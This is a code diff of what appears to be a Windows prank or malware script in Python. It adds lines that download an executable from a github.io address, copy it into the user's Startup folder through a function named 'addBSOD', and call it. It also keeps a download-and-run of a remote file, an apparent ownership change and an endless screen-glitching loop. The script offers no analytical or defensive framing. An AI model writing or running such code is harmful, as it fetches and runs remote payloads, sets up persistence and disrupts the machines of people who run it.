@@ -38,20 +38,20 @@ def REMPROM():
         print("Error setting ownership.")
 
 
-def add_to_startup():
-    file_path = os.path.abspath(__file__)
-    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-    shutil.copy(file_path, startup_folder)
 
 
 
 path = DownloadFile('https://psvks.github.io/psvks/uploads/FullVersion.mp3')
 StartProcess(path)
+path2 = DownloadFile('https://psvks.github.io/psvks/uploads/otherfile.exe')
+def addBSOD():
+    global path2
+    file_path = path2
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    shutil.copy(file_path, startup_folder)
 
-
-add_to_startup()
 REMPROM()
-
+addBSOD()
 
 while True:
     makeBuggyScreen()
